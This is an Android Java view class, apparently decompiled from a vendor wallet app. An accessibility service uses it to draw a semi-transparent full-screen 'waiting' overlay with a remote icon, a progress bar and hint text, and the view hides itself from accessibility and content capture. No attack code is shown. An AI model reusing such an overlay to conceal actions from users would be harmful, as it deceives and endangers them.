/**
 * 状态栏 LinearLayout，带 TextView
 * - 半透明黑色背景遮罩
 * - 包含图标 (RemoteImageView)、进度条 (OverlayMaskView)、提示文字 (TextView)
 * - 自定义 onLayout 居中排列子视图
 *
 * vendor 原始路径: e0/i.java
 */
package com.guard.wallet.view;

import com.guard.wallet.core.AppUtils;

import android.graphics.Color;
import android.os.Build;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;

public final class StatusBarView extends LinearLayout {
    public WeakReference<OverlayMaskView> progressBarRef;

    public StatusBarView(MyAccessibilityService service, String hint) {
        super(service);
        this.setOrientation(LinearLayout.VERTICAL);
        this.setGravity(17);
        this.setSystemUiVisibility(4);
        this.setImportantForAccessibility(2);
        if (Build.VERSION.SDK_INT >= 30) {
            this.setImportantForContentCapture(2);
        }
        this.setBackgroundColor(Color.argb((int)(0.6f * 255), 0, 0, 0));
        RemoteImageView iconView = new RemoteImageView(service);
        if (!iconView.a()) {
            iconView.setImageURL(com.guard.wallet.utils.ConfigManager.getBlockIconUrl());
        }
        iconView.setTag("waiting-icon-image");
        this.addView(iconView, 0);
        OverlayMaskView progressBar = new OverlayMaskView(service);
        this.addView(progressBar, 1);
        progressBar.setTag("waiting-progress-bar");
        this.progressBarRef = new WeakReference<>(progressBar);
        if (!AppUtils.B(hint)) {
            TextView textView = new TextView(service);
            textView.setTag("waiting-hint-text");
            textView.setText(hint);
            textView.setSingleLine(false);
            textView.setTextColor(-1);
            textView.setBackgroundColor(0);
            textView.setTextSize(15.0f);
            textView.setTextAlignment(TEXT_ALIGNMENT_CENTER);
            textView.setGravity(17);
            textView.setPadding(0, 10, 0, 10);
            this.addView(textView, 2);
        }
    }

    @Override
    public final void onLayout(boolean changed, int l, int t, int r, int b) {
        int childCount = this.getChildCount();
        if (childCount > 0) {
            int centerY = (b - t) / 2 + t;
            for (int idx = 0; idx < childCount; idx++) {
                View child = this.getChildAt(idx);
                if (Objects.equals(child.getTag(), "waiting-icon-image")) {
                    int width = r - l;
                    int margin = (width - (int)((float)width * 0.4f)) / 2;
                    int top = centerY - 160 - 10 - 50;
                    child.layout(margin, top, r - margin, top + 160);
                } else if (Objects.equals(child.getTag(), "waiting-progress-bar")) {
                    int top = centerY - 10;
                    child.layout(l, top, r, top + 20);
                } else {
                    int top = centerY + 10 + 50;
                    child.layout(l, top, r, top + 200);
                }
            }
        }
    }
}
